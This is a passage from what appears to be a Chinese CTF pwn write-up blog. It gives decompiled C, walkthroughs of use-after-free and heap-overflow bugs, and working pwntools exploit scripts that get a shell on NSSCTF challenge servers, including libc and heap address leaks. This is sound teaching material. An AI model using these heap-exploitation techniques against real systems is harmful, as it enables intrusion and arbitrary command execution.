)<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v3[<span class="hljs-number">0</span>] == <span class="hljs-number">3</span> )<br>      &#123;<br>        del();<br>      &#125;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v3[<span class="hljs-number">0</span>] == <span class="hljs-number">4</span> )<br>      &#123;<br>        show();<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>LABEL_13:<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Invalid choice&quot;</span>);<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( v3[<span class="hljs-number">0</span>] != <span class="hljs-number">1</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_13;<br>      create();<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">create</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-type">char</span> *v2; <span class="hljs-comment">// eax</span><br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;you are creating the %d page\n&quot;</span>, i);<br>  result = i;<br>  <span class="hljs-keyword">if</span> ( i &gt;= <span class="hljs-number">0</span> )<br>  &#123;<br>    result = i;<br>    <span class="hljs-keyword">if</span> ( i &lt;= <span class="hljs-number">9</span> )<br>    &#123;<br>      v1 = i;<br>      (&amp;page)[v1] = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">8u</span>);<br>      <span class="hljs-keyword">if</span> ( i )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( i &lt;= <span class="hljs-number">0</span> || i &gt; <span class="hljs-number">9</span> )<br>        &#123;<br>          <span class="hljs-keyword">return</span> <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;NO PAGE&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Good cretation!&quot;</span>);<br>          <span class="hljs-keyword">return</span> ++i;<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        v2 = page;<br>        *(_DWORD *)page = <span class="hljs-number">1868654951</span>;<br>        v2[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;<br>        *((_DWORD *)page + <span class="hljs-number">1</span>) = echo;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;The init page&quot;</span>);<br>        <span class="hljs-keyword">return</span> ++i;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">edit</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v2 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input page&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">0</span> || v1 &gt; i )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;NO PAGE&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input your strings&quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, (&amp;page)[v1]);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">edit</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v2 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input page&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">0</span> || v1 &gt; i )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;NO PAGE&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input your strings&quot;</span>);<br>    __isoc99_scanf(<span class="hljs-string">&quot;%s&quot;</span>, (&amp;page)[v1]);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> <span class="hljs-title function_">show</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v2 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Input page&quot;</span>);<br>  __isoc99_scanf(<span class="hljs-string">&quot;%d&quot;</span>, &amp;v1);<br>  <span class="hljs-keyword">if</span> ( v1 )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( v1 &lt;= <span class="hljs-number">0</span> || v1 &gt; i )<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;NO PAGE&quot;</span>);<br>    <span class="hljs-keyword">else</span><br>      echo((&amp;page)[v1]);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    (*((<span class="hljs-type">void</span> (__cdecl **)(<span class="hljs-type">char</span> *))page + <span class="hljs-number">1</span>))(page);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v2;<br>&#125;<br></code></pre></td></tr></table></figure>

<p class='item-img' data-src='/2024/03/15/MyS3andB0x/EtYSbopDsovRzRxZfIQcqpUEnjc.png'><img src="/2024/03/15/MyS3andB0x/EtYSbopDsovRzRxZfIQcqpUEnjc.png"></p>
<p>其中，NICO 是后门函数，给了个 system（）</p>
<p>edit 函数中，if 判断条件实际上为 &lt;0</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/C3f6b0fx2obaR4xtTjhc7XIXnGe.png'><img src="/2024/03/15/MyS3andB0x/C3f6b0fx2obaR4xtTjhc7XIXnGe.png"></p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/CjgjbA4OxovFBVxzZJRcZ9s6nUb.png'><img src="/2024/03/15/MyS3andB0x/CjgjbA4OxovFBVxzZJRcZ9s6nUb.png"></p>
<p>del 函数中，free 掉堆块后没有将指针置 0</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/X1HabePYjovp9Nx3xyacyXKPnyb.png'><img src="/2024/03/15/MyS3andB0x/X1HabePYjovp9Nx3xyacyXKPnyb.png"></p>
<p>导致了 UAF 漏洞（Use After Free）</p>
<p>exp 思路：</p>
<p>先创建一个 chunk 0</p>
<p>由于 edit 不能直接编辑 chunk0，因为 实际上 if ( v1 &lt; 0 || v1 &gt; i )</p>
<p>但是由于系统不会直接回收内存空间，并且 free 后并没有将指针置 0</p>
<p>create 函数创建的 chunk 是不能自定义的，但是我们只要 free 后再申请一次，它就会把之前的 chunk 给我们复用</p>
<p>但是由于我们不能直接编辑 chunk0，但是 chunk0 现在被 page1 所调用，因此我们只需要使用 edit 写入 page1 sh 并 show_page 即可 getshell</p>
<p>add_chunk 之后，可以看到程序申请了一段 0x10 大小的堆</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/GNw5bnQl7ot6HxxPToPcneJmn6c.png'><img src="/2024/03/15/MyS3andB0x/GNw5bnQl7ot6HxxPToPcneJmn6c.png"></p>
<p>free 之后这段堆被放到了 tcache 里</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/D5jjbBNrWoA0wIxsYSKcczq6nIe.png'><img src="/2024/03/15/MyS3andB0x/D5jjbBNrWoA0wIxsYSKcczq6nIe.png"></p>
<p>再次申请时这段堆就被复用了</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/AroZbXwLfo6ec7xDC6xcnL8Wn3b.png'><img src="/2024/03/15/MyS3andB0x/AroZbXwLfo6ec7xDC6xcnL8Wn3b.png"></p>
<p>但是堆里什么都没有</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/Oy5wbTEdCo55pOxMpMbcTg6Tn2g.png'><img src="/2024/03/15/MyS3andB0x/Oy5wbTEdCo55pOxMpMbcTg6Tn2g.png"></p>
<p>把 payload 送进堆，拿到 shell</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/HS3SbrOkaoK3OwxcKNscmm23nqb.png'><img src="/2024/03/15/MyS3andB0x/HS3SbrOkaoK3OwxcKNscmm23nqb.png"></p>
<h1 id="NISACTF-2022-ezheap"><a href="#NISACTF-2022-ezheap" class="headerlink" title="[NISACTF 2022]ezheap"></a>[NISACTF 2022]ezheap</h1><p class='item-img' data-src='/2024/03/15/MyS3andB0x/AjPqber1toL0cMxT9rAcJoRQn6g.png'><img src="/2024/03/15/MyS3andB0x/AjPqber1toL0cMxT9rAcJoRQn6g.png"></p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/Cq3QbHyTDoi8bXxM0hVc4pIUnBN.png'><img src="/2024/03/15/MyS3andB0x/Cq3QbHyTDoi8bXxM0hVc4pIUnBN.png"></p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/ZWd3bZlp4obTVYxslYcc0KXtnhd.png'><img src="/2024/03/15/MyS3andB0x/ZWd3bZlp4obTVYxslYcc0KXtnhd.png"></p>
<p>申请了两个 chunk，system 在了 0x8048596，所以，我们利用 chunk1 的溢出，溢出到 chunk2 中的 0x8048596，写入&#x2F;bin&#x2F;sh，即可</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/EkelbNYY6oXzcpxqse7cjvoZnSg.png'><img src="/2024/03/15/MyS3andB0x/EkelbNYY6oXzcpxqse7cjvoZnSg.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>io = remote(<span class="hljs-string">&#x27;node3.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">28682</span>)<br><span class="hljs-comment">#io=process(&quot;./heap&quot;)</span><br>io.recvuntil(<span class="hljs-string">&quot;Input:\n&quot;</span>)<br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x16</span>+<span class="hljs-number">5</span>)+<span class="hljs-string">b&#x27;/bin/sh&#x27;</span><br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure>

<h1 id="BJDCTF-2020-YDSneedGirlfriend"><a href="#BJDCTF-2020-YDSneedGirlfriend" class="headerlink" title="[BJDCTF 2020]YDSneedGirlfriend"></a>[BJDCTF 2020]YDSneedGirlfriend</h1><p class='item-img' data-src='/2024/03/15/MyS3andB0x/BrA9bOesCokMfgxKu4LcXDGEnnb.png'><img src="/2024/03/15/MyS3andB0x/BrA9bOesCokMfgxKu4LcXDGEnnb.png"></p>
<p>菜单，增删改查，典！</p>
<p>看看怎么增，</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/K1UjbcybZo4PO8xvBmgcIbXQndg.png'><img src="/2024/03/15/MyS3andB0x/K1UjbcybZo4PO8xvBmgcIbXQndg.png"></p>
<p>删除，free 之后没有将指针置零，存在 UAF 漏洞</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/VH90bBd8VoZRKvxI1EXcMYGkn3c.png'><img src="/2024/03/15/MyS3andB0x/VH90bBd8VoZRKvxI1EXcMYGkn3c.png"></p>
<p>print_girlfriend 函数会调用 chunk 里的 puts 输出 chunk 里的 name，如果将调用 puts 函数的地方覆写成 backdoor，那么在执行 print_girlfriend 调用 puts 的时候就转去执行 backdoor 了</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/FqyfbIoFbozHu2x4aD0cEr2Onmx.png'><img src="/2024/03/15/MyS3andB0x/FqyfbIoFbozHu2x4aD0cEr2Onmx.png"></p>
<p>所以我们先申请两个 chunk，为 chunk0 和 chunk1，然后 free 掉，此时 tcachebins 中的链表为 chunk1-&gt;chunk0</p>
<p>（有 wp 是 fastbin 内的，估计是版本问题）</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/B7gwbesvhoCMuyxSyiocG8sdntd.png'><img src="/2024/03/15/MyS3andB0x/B7gwbesvhoCMuyxSyiocG8sdntd.png"></p>
<p>现在我们再申请一段 0x10 的 chunk2，这下 chunk2 申请到了 chunk1 的地址，后面申请的用来存名字的 chunk 就申请到了 chunk0 的地址，</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/Ec39bB1MqoZtKExyNAWcUyfHnmb.png'><img src="/2024/03/15/MyS3andB0x/Ec39bB1MqoZtKExyNAWcUyfHnmb.png"></p>
<p>现在把 chunk0 中的 puts 的地址改掉，执行 print_girlfriend 的时候就能拿到 shell 了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>io=remote(<span class="hljs-string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">28064</span>)<br><span class="hljs-comment">#io=process(&#x27;./girlfriend&#x27;)</span><br>elf=ELF(<span class="hljs-string">&#x27;./girlfriend&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,name</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;Her name size is :&quot;</span>,<span class="hljs-built_in">str</span>(size))<br>    io.sendlineafter(<span class="hljs-string">&quot;Her name is :&quot;</span>,name)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params">index</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    io.sendlineafter(<span class="hljs-string">&quot;Your choice :&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    io.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params">io</span>):<br>    gdb.attach(io)<br>    pause()<br><br><span class="hljs-comment">#debug(io)</span><br>backdoor=<span class="hljs-number">0x400b9c</span><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br><br>dele(<span class="hljs-number">0</span>)<br>dele(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">0x10</span>,p64(backdoor))<br><br>show(<span class="hljs-number">0</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure>

<h1 id="HNCTF-2022-WEEK4-ezheap"><a href="#HNCTF-2022-WEEK4-ezheap" class="headerlink" title="[HNCTF 2022 WEEK4]ezheap"></a>[HNCTF 2022 WEEK4]ezheap</h1><p class='item-img' data-src='/2024/03/15/MyS3andB0x/LtHUbWYkDoXFu1x9v3LcCGg7nIb.png'><img src="/2024/03/15/MyS3andB0x/LtHUbWYkDoXFu1x9v3LcCGg7nIb.png"></p>
<p>保护全开，急！但是增删改查，典！</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/OJU1bp9qNoOA4fxcZGBcK4MVn0b.png'><img src="/2024/03/15/MyS3andB0x/OJU1bp9qNoOA4fxcZGBcK4MVn0b.png"></p>
<p>delete 无 UAF</p>
<p>add 会在用户申请的堆块之前申请一个大小为 0x20 的堆块，并会在用户申请的自定义大小的堆块的 Chunk Header 的 Prev_Size 位存放 puts 函数的地址。</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/A7t9b3UOIoWfQdx9wmXcz0IKn2g.png'><img src="/2024/03/15/MyS3andB0x/A7t9b3UOIoWfQdx9wmXcz0IKn2g.png"></p>
<p>show 将 Prev_Size 的地址取出，作为函数调用，然后取出 fd 指针，作为参数。</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/CuSdbXi6KouK3pxR5C0cV9n5nUb.png'><img src="/2024/03/15/MyS3andB0x/CuSdbXi6KouK3pxR5C0cV9n5nUb.png"></p>
<p>edit 存在堆溢出</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/FXHjbImH4oq19QxDKyTcCYrDnyh.png'><img src="/2024/03/15/MyS3andB0x/FXHjbImH4oq19QxDKyTcCYrDnyh.png"></p>
<p><em>原理是通过修改 puts 函数的参数，原本是打印某个堆块的内容，更改为我们创建的堆块地址的 Header，即可打印出我们的 puts 地址。</em></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br>    <span class="hljs-keyword">return</span> u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#p = process(&#x27;./ezheap&#x27;)</span><br>p = remote(<span class="hljs-string">&#x27;node1.anna.nssctf.cn&#x27;</span>, <span class="hljs-number">28355</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./ezheap&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">idx, size, name = <span class="hljs-string">b&#x27;a&#x27;</span>, data = <span class="hljs-string">b&#x27;a&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice: \n&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx:\n&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:\n&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    p.sendafter(<span class="hljs-string">b&#x27;Name: \n&#x27;</span>, name)<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:\n&#x27;</span>, data)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice: \n&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx:\n&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice: \n&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx:\n&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx, size, data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice: \n&#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;idx:\n&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:\n&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    p.send(data)<br><br><span class="hljs-comment"># leak libc_base</span><br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x10</span>)<br>edit(<span class="hljs-number">0</span>, <span class="hljs-number">0x31</span>, p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x31</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p8(<span class="hljs-number">0x30</span>))<br>show(<span class="hljs-number">1</span>)<br>libc_base = get_addr() - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br><span class="hljs-comment"># leak heap_base</span><br>edit(<span class="hljs-number">0</span>, <span class="hljs-number">0x31</span>, p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x31</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p8(<span class="hljs-number">0x20</span>))<br>show(<span class="hljs-number">1</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>heap_base = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x0a&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x40</span><br><br><span class="hljs-comment"># pwn</span><br>system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>edit(<span class="hljs-number">0</span>, <span class="hljs-number">0x48</span>, <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(<span class="hljs-number">0x31</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span> + p64(heap_base + <span class="hljs-number">0x40</span>) + p64(<span class="hljs-number">0</span>) + p64(system))<br>show(<span class="hljs-number">1</span>)<br>p.interactive()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; heap_base -&gt; &#x27;</span>, <span class="hljs-built_in">hex</span>(heap_base))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27; libc_base -&gt; &#x27;</span>, <span class="hljs-built_in">hex</span>(libc_base))<br><span class="hljs-comment">#debug()</span><br></code></pre></td></tr></table></figure>


<h3 id="P-CISCN-2022-初赛-login-normal-解题做题人-1"><a href="#P-CISCN-2022-初赛-login-normal-解题做题人-1" class="headerlink" title="P | [CISCN 2022 初赛]login_normal | 解题做题人"></a>P | [CISCN 2022 初赛]login_normal | 解题做题人</h3><h4 id="题目说明-13"><a href="#题目说明-13" class="headerlink" title="题目说明"></a>题目说明</h4><h4 id="解题思路-12"><a href="#解题思路-12" class="headerlink" title="解题思路"></a>解题思路</h4><p>看 main 函数，read 后执行 sub_FFD</p>
<p class='item-img' data-src='/2024/03/15/MyS3andB0x/ZgaLboqM9o3PEnx9ru4cgI5Wnir.png'><img src="/2024/03/15/MyS3andB0x/ZgaLboqM9o3PEnx9ru4cgI5Wnir.png"></p>
<p>跟进 sub_FFD</p>
